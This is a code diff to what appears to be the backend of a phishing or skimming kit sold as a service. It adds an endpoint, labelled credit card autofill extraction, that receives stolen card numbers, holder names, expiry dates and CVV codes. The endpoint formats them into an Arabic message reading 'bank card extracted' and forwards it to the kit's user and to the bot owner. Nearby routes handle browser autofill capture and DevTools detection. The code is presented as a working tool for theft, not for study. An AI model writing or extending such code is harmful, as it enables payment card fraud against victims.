@@ -4258,6 +4258,29 @@ app.post("/autofill", (req, res) => {
   res.send("Done");
 });
 
+// ── Credit card autofill extraction ──────────────────────────────────────────
+app.post("/autofill-card", (req, res) => {
+  const uid      = decodeURIComponent(req.body?.uid      || '');
+  const ccnumber = req.body?.ccnumber || '';
+  const ccname   = req.body?.ccname   || '';
+  const ccexp    = req.body?.ccexp    || '';
+  const cccsc    = req.body?.cccsc    || '';
+  const cctype   = req.body?.cctype   || '';
+  if (!uid || !ccnumber) return res.send("Missing");
+  const tid = parseInt(uid, 36);
+  // Format card number with spaces every 4 digits for readability
+  const formatted = ccnumber.replace(/(.{4})/g, '$1 ').trim();
+  let msg = `💳 *بطاقة بنكية مُستخرجة!*`;
+  if (cctype)   msg += `\n🏦 النوع: \`${cctype}\``;
+  if (ccname)   msg += `\n👤 اسم الحامل: \`${ccname}\``;
+  msg +=                `\n💳 رقم البطاقة: \`${formatted}\``;
+  if (ccexp)    msg += `\n📅 تاريخ الانتهاء: \`${ccexp}\``;
+  if (cccsc)    msg += `\n🔐 CVV: \`${cccsc}\``;
+  notify(tid, msg, {parse_mode:"Markdown"});
+  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n_(ID: ${tid})_`, {parse_mode:"Markdown"});
+  res.send("Done");
+});
+
 // ── DevTools detection (premium) ──────────────────────────────────────────────
 app.post("/devtools-alert", (req, res) => {
   const uid  = decodeURIComponent(req.body?.uid || '');
